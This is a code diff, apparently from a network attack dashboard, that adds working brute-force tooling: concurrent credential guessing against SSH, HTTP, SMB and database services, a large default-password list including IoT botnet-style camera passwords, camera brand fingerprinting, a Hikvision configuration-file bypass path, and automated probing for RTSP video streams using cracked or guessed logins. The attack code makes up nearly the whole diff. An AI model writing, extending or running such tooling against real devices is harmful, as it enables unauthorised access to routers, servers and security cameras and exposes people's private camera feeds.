@@ -344,6 +344,66 @@ function handleApiRequest(urlPath, method, body, res) {
         return;
     }
 
+    // Parallel fast credential testing (concurrent connections)
+    if (urlPath === '/api/parallel-test-credentials' && method === 'POST') {
+        const data = JSON.parse(body);
+        const deviceType = data.deviceType || 'Unknown';
+        const brand = data.brand || null;
+        const userCreds = data.credentials || [];
+        const builtinCreds = getCredentialsForDevice(deviceType, brand);
+        const allCreds = [...userCreds, ...builtinCreds];
+        const uniqueCreds = [];
+        const seen = new Set();
+        for (const c of allCreds) {
+            const key = `${c.username}:${c.password}`;
+            if (!seen.has(key)) { seen.add(key); uniqueCreds.push(c); }
+        }
+        const concurrency = data.concurrency || 8;
+        parallelTestCredentials(data.host, data.port || 22, data.service || 'ssh', uniqueCreds, concurrency, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Camera scan (identify brand, test creds, find RTSP streams)
+    if (urlPath === '/api/scan-camera' && method === 'POST') {
+        const data = JSON.parse(body);
+        scanCamera(data.host, data.openPorts || [80, 554], (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Get credential database
+    if (urlPath === '/api/credential-db' && method === 'GET') {
+        res.writeHead(200);
+        res.end(JSON.stringify({
+            categories: Object.keys(CREDENTIAL_DB),
+            counts: Object.fromEntries(Object.entries(CREDENTIAL_DB).map(([k, v]) => [k, v.length])),
+            total: Object.values(CREDENTIAL_DB).reduce((sum, arr) => sum + arr.length, 0)
+        }));
+        return;
+    }
+
+    // Get camera architectures
+    if (urlPath === '/api/camera-architectures' && method === 'GET') {
+        res.writeHead(200);
+        res.end(JSON.stringify(CAMERA_ARCHITECTURES));
+        return;
+    }
+
+    // Test RTSP stream
+    if (urlPath === '/api/test-rtsp' && method === 'POST') {
+        const data = JSON.parse(body);
+        testRTSPAccess(data.host, data.port || 554, data.path || '/stream1', data.username || '', data.password || '', (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
     // Network scan a specific subnet
     if (urlPath === '/api/scan-subnet' && method === 'POST') {
         const data = JSON.parse(body);
@@ -1603,6 +1663,375 @@ function mapExploitToATTACK(method) {
         'Nmap-VulnScan': { tactics: ['reconnaissance'], techniques: ['T1595.002'] }
     };
     return mapping[method] || { tactics: ['unknown'], techniques: [] };
+}
+
+// ===== COMPREHENSIVE CREDENTIAL DATABASE =====
+const CREDENTIAL_DB = {
+    cameras: [
+        { username: 'admin', password: 'admin' },
+        { username: 'admin', password: '12345' },
+        { username: 'admin', password: '123456' },
+        { username: 'admin', password: '' },
+        { username: 'admin', password: 'password' },
+        { username: 'admin', password: '888888' },
+        { username: 'admin', password: '666666' },
+        { username: 'admin', password: '1111' },
+        { username: 'admin', password: '1234' },
+        { username: 'admin', password: '4321' },
+        { username: 'admin', password: '54321' },
+        { username: 'admin', password: 'pass' },
+        { username: 'admin', password: 'admin123' },
+        { username: 'admin', password: 'Admin123' },
+        { username: 'admin', password: 'camera' },
+        { username: 'admin', password: 'Camera123' },
+        { username: 'root', password: 'root' },
+        { username: 'root', password: 'admin' },
+        { username: 'root', password: 'pass' },
+        { username: 'root', password: '123456' },
+        { username: 'root', password: 'vizxv' },
+        { username: 'root', password: 'xc3511' },
+        { username: 'root', password: 'ikwb' },
+        { username: 'root', password: 'dreambox' },
+        { username: 'root', password: 'xmhdipc' },
+        { username: 'root', password: 'juantech' },
+        { username: 'root', password: 'realtek' },
+        { username: 'root', password: '7ujMko0admin' },
+        { username: 'root', password: 'zlxx.' },
+        { username: 'root', password: 'Zte521' },
+        { username: 'root', password: 'hi3518' },
+        { username: 'root', password: 'anko' },
+        { username: 'root', password: 'jvbzd' },
+        { username: 'root', password: 'system' },
+        { username: 'service', password: 'service' },
+        { username: 'supervisor', password: 'supervisor' },
+        { username: 'guest', password: 'guest' },
+        { username: 'user', password: 'user' },
+        { username: 'default', password: 'default' },
+        { username: 'user1', password: '1user1' }
+    ],
+    hikvision: [
+        { username: 'admin', password: '12345' },
+        { username: 'admin', password: 'admin12345' },
+        { username: 'admin', password: 'hiklinux' },
+        { username: 'admin', password: 'Hik12345' },
+        { username: 'admin', password: 'a]]' },
+        { username: 'admin', password: '2345678' },
+        { username: 'admin', password: '12345678' }
+    ],
+    dahua: [
+        { username: 'admin', password: 'admin' },
+        { username: 'admin', password: '123456' },
+        { username: 'admin', password: 'dahua' },
+        { username: 'admin', password: 'Dahua123' },
+        { username: 'admin', password: 'DahuaTech' },
+        { username: 'root', password: 'root' },
+        { username: '888888', password: '888888' },
+        { username: '666666', password: '666666' }
+    ],
+    axis: [
+        { username: 'root', password: 'pass' },
+        { username: 'root', password: 'root' },
+        { username: 'admin', password: 'admin' }
+    ],
+    samsung: [
+        { username: 'admin', password: '4321' },
+        { username: 'admin', password: 'admin' },
+        { username: 'root', password: '4321' }
+    ],
+    routers: [
+        { username: 'admin', password: 'admin' },
+        { username: 'admin', password: 'password' },
+        { username: 'admin', password: '' },
+        { username: 'admin', password: '1234' },
+        { username: 'admin', password: '12345' },
+        { username: 'admin', password: '123456' },
+        { username: 'root', password: 'root' },
+        { username: 'root', password: 'admin' },
+        { username: 'admin', password: 'motorola' },
+        { username: 'admin', password: 'changeme' },
+        { username: 'user', password: 'user' },
+        { username: 'cusadmin', password: 'highspeed' },
+        { username: 'admin', password: 'sky' },
+        { username: 'admin', password: 'cisco' },
+        { username: 'cisco', password: 'cisco' },
+        { username: 'admin', password: 'mikrotik' },
+        { username: 'admin', password: 'ubnt' }
+    ],
+    ssh: [
+        { username: 'root', password: 'root' },
+        { username: 'root', password: 'toor' },
+        { username: 'root', password: 'admin' },
+        { username: 'root', password: 'password' },
+        { username: 'root', password: '123456' },
+        { username: 'root', password: '12345678' },
+        { username: 'admin', password: 'admin' },
+        { username: 'admin', password: 'password' },
+        { username: 'admin', password: '123456' },
+        { username: 'user', password: 'user' },
+        { username: 'user', password: 'password' },
+        { username: 'test', password: 'test' },
+        { username: 'guest', password: 'guest' },
+        { username: 'ubuntu', password: 'ubuntu' },
+        { username: 'pi', password: 'raspberry' },
+        { username: 'oracle', password: 'oracle' },
+        { username: 'postgres', password: 'postgres' },
+        { username: 'mysql', password: 'mysql' },
+        { username: 'ftpuser', password: 'ftpuser' },
+        { username: 'nagios', password: 'nagios' }
+    ],
+    smb: [
+        { username: 'administrator', password: 'administrator' },
+        { username: 'administrator', password: 'password' },
+        { username: 'administrator', password: '123456' },
+        { username: 'administrator', password: 'admin' },
+        { username: 'admin', password: 'admin' },
+        { username: 'admin', password: 'password' },
+        { username: 'guest', password: '' },
+        { username: 'guest', password: 'guest' }
+    ],
+    database: [
+        { username: 'root', password: '' },
+        { username: 'root', password: 'root' },
+        { username: 'root', password: 'mysql' },
+        { username: 'root', password: 'password' },
+        { username: 'root', password: '123456' },
+        { username: 'sa', password: '' },
+        { username: 'sa', password: 'sa' },
+        { username: 'sa', password: 'password' },
+        { username: 'postgres', password: 'postgres' },
+        { username: 'postgres', password: 'password' },
+        { username: 'mongo', password: 'mongo' },
+        { username: 'admin', password: 'admin' }
+    ]
+};
+
+// Camera architectures and brands database
+const CAMERA_ARCHITECTURES = {
+    hikvision: {
+        name: 'Hikvision',
+        rtspPaths: ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream', '/live'],
+        httpPaths: ['/ISAPI/System/deviceInfo', '/doc/page/login.asp', '/System/configurationFile?auth=YWRtaW46MTEK'],
+        defaultPorts: [80, 443, 554, 8000, 8200],
+        signatures: ['hikvision', 'HIKVISION', 'Hik-Connect', 'DVRDVS-Webs']
+    },
+    dahua: {
+        name: 'Dahua',
+        rtspPaths: ['/cam/realmonitor?channel=1&subtype=0', '/live', '/cam1/mpeg4'],
+        httpPaths: ['/RPC2_Login', '/cgi-bin/magicBox.cgi?action=getSystemInfo'],
+        defaultPorts: [80, 443, 554, 37777],
+        signatures: ['dahua', 'DahuaTech', 'DHCP', 'Amcrest']
+    },
+    axis: {
+        name: 'Axis',
+        rtspPaths: ['/axis-media/media.amp', '/mpeg4/media.amp', '/mjpg/video.mjpg'],
+        httpPaths: ['/axis-cgi/param.cgi', '/axis-cgi/mjpg/video.cgi'],
+        defaultPorts: [80, 443, 554],
+        signatures: ['AXIS', 'axis', 'Axis Communications']
+    },
+    samsung: {
+        name: 'Samsung/Hanwha',
+        rtspPaths: ['/profile1/media.smp', '/onvif/profile2/media.smp'],
+        httpPaths: ['/home/monitoring.cgi'],
+        defaultPorts: [80, 443, 554, 4520],
+        signatures: ['samsung', 'SAMSUNG', 'Hanwha', 'wisenet']
+    },
+    generic_onvif: {
+        name: 'Generic ONVIF',
+        rtspPaths: ['/stream1', '/stream0', '/video1', '/media/video1', '/onvif1', '/h264'],
+        httpPaths: ['/onvif/device_service'],
+        defaultPorts: [80, 554, 8080],
+        signatures: ['onvif', 'ONVIF']
+    },
+    reolink: {
+        name: 'Reolink',
+        rtspPaths: ['/h264Preview_01_main', '/h264Preview_01_sub'],
+        httpPaths: ['/cgi-bin/api.cgi?cmd=Login'],
+        defaultPorts: [80, 443, 554, 9000],
+        signatures: ['reolink', 'Reolink']
+    },
+    uniview: {
+        name: 'Uniview',
+        rtspPaths: ['/media/video1', '/unicast/c1/s0/live'],
+        httpPaths: ['/cgi-bin/main-cgi?json'],
+        defaultPorts: [80, 443, 554],
+        signatures: ['uniview', 'Uniview', 'UNV']
+    },
+    tplink: {
+        name: 'TP-Link',
+        rtspPaths: ['/stream1', '/stream2'],
+        httpPaths: ['/'],
+        defaultPorts: [80, 443, 554, 2020],
+        signatures: ['tp-link', 'TP-LINK', 'tplink']
+    }
+};
+
+// Parallel credential testing engine - tests N credentials concurrently
+function parallelTestCredentials(host, port, service, credentials, concurrency, callback) {
+    const results = [];
+    let index = 0;
+    let active = 0;
+    let found = false;
+    let completed = 0;
+    const total = credentials.length;
+
+    function launchNext() {
+        while (active < concurrency && index < credentials.length && !found) {
+            active++;
+            const cred = credentials[index++];
+            testCredentials(host, port, service, cred.username, cred.password, (r) => {
+                r.password = cred.password;
+                results.push(r);
+                completed++;
+                if (r.success) found = true;
+                active--;
+                if (found || completed >= total) {
+                    if (active === 0) finish();
+                } else {
+                    launchNext();
+                }
+            });
+        }
+        if (active === 0 && (found || index >= credentials.length)) {
+            finish();
+        }
+    }
+
+    function finish() {
+        const best = results.find(r => r.success);
+        callback({
+            success: !!best,
+            method: best ? best.method : `${service}-brute`,
+            host, port, service,
+            username: best ? best.username : null,
+            password: best ? best.password : null,
+            allResults: results,
+            attempts: results.length,
+            total: credentials.length,
+            info: best ? `Login successful: ${best.username}:${best.password}` : `All ${results.length} attempts failed`
+        });
+    }
+
+    launchNext();
+}
+
+// Identify camera brand from HTTP banner
+function identifyCameraBrand(host, port, callback) {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+    let response = '';
+
+    socket.on('data', (data) => { response += data.toString(); });
+    socket.on('connect', () => {
+        socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n`);
+        setTimeout(() => {
+            socket.destroy();
+            const lower = response.toLowerCase();
+            for (const [brand, info] of Object.entries(CAMERA_ARCHITECTURES)) {
+                for (const sig of info.signatures) {
+                    if (lower.includes(sig.toLowerCase())) {
+                        callback({ brand, name: info.name, response: response.substring(0, 300) });
+                        return;
+                    }
+                }
+            }
+            callback({ brand: 'unknown', name: 'Unknown Camera', response: response.substring(0, 300) });
+        }, 3000);
+    });
+    socket.on('timeout', () => { socket.destroy(); callback({ brand: 'unknown', name: 'Unknown' }); });
+    socket.on('error', () => { callback({ brand: 'unknown', name: 'Unknown' }); });
+    socket.connect(port, host);
+}
+
+// Test RTSP stream access
+function testRTSPAccess(host, port, path, username, password, callback) {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+    let response = '';
+    const authStr = username && password ? `${username}:${password}@` : '';
+    const url = `rtsp://${authStr}${host}:${port}${path}`;
+
+    socket.on('data', (data) => { response += data.toString(); });
+    socket.on('connect', () => {
+        socket.write(`DESCRIBE ${url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: MonkeyAgent\r\nAccept: application/sdp\r\n\r\n`);
+        setTimeout(() => {
+            socket.destroy();
+            const success = response.includes('200 OK') || response.includes('application/sdp');
+            const unauthorized = response.includes('401');
+            callback({ success, unauthorized, url: `rtsp://${host}:${port}${path}`, response: response.substring(0, 200) });
+        }, 3000);
+    });
+    socket.on('timeout', () => { socket.destroy(); callback({ success: false, url }); });
+    socket.on('error', () => { callback({ success: false, url }); });
+    socket.connect(port || 554, host);
+}
+
+// Full camera scan: identify brand, test credentials, try RTSP paths
+function scanCamera(host, openPorts, callback) {
+    const results = { host, brand: 'unknown', brandName: 'Unknown', rtspStreams: [], credentials: [], vulnerabilities: [] };
+    const httpPort = openPorts.find(p => [80, 8080, 443].includes(p)) || 80;
+    const rtspPort = openPorts.find(p => [554, 8554].includes(p)) || 554;
+
+    identifyCameraBrand(host, httpPort, (brandInfo) => {
+        results.brand = brandInfo.brand;
+        results.brandName = brandInfo.name;
+
+        const arch = CAMERA_ARCHITECTURES[brandInfo.brand] || CAMERA_ARCHITECTURES.generic_onvif;
+        const creds = [
+            ...(CREDENTIAL_DB[brandInfo.brand] || []),
+            ...CREDENTIAL_DB.cameras
+        ];
+        const uniqueCreds = [];
+        const seen = new Set();
+        for (const c of creds) {
+            const key = `${c.username}:${c.password}`;
+            if (!seen.has(key)) { seen.add(key); uniqueCreds.push(c); }
+        }
+
+        // Test HTTP credentials
+        parallelTestCredentials(host, httpPort, 'http', uniqueCreds.slice(0, 30), 5, (credResult) => {
+            results.credentials = credResult;
+
+            // Test RTSP paths
+            let rtspDone = 0;
+            const rtspPaths = arch.rtspPaths || [];
+            if (rtspPaths.length === 0) { callback(results); return; }
+
+            for (const rtspPath of rtspPaths) {
+                const username = credResult.success ? credResult.username : 'admin';
+                const password = credResult.success ? credResult.password : 'admin';
+                testRTSPAccess(host, rtspPort, rtspPath, username, password, (rtspResult) => {
+                    if (rtspResult.success) {
+                        results.rtspStreams.push(rtspResult.url);
+                    }
+                    rtspDone++;
+                    if (rtspDone >= rtspPaths.length) {
+                        callback(results);
+                    }
+                });
+            }
+        });
+    });
+}
+
+// Get credentials for a device type
+function getCredentialsForDevice(deviceType, brand) {
+    const brandCreds = brand && CREDENTIAL_DB[brand] ? CREDENTIAL_DB[brand] : [];
+    let typeCreds = [];
+    if (deviceType === 'Camera') typeCreds = CREDENTIAL_DB.cameras;
+    else if (deviceType === 'Router') typeCreds = CREDENTIAL_DB.routers;
+    else if (deviceType === 'Linux Server' || deviceType === 'Web Server') typeCreds = CREDENTIAL_DB.ssh;
+    else if (deviceType === 'Windows PC') typeCreds = CREDENTIAL_DB.smb;
+    else if (deviceType === 'Database Server') typeCreds = CREDENTIAL_DB.database;
+    else typeCreds = CREDENTIAL_DB.ssh;
+
+    const all = [...brandCreds, ...typeCreds];
+    const uniqueCreds = [];
+    const seen = new Set();
+    for (const c of all) {
+        const key = `${c.username}:${c.password}`;
+        if (!seen.has(key)) { seen.add(key); uniqueCreds.push(c); }
+    }
+    return uniqueCreds;
 }
 
 // Device type identification based on open ports and OS
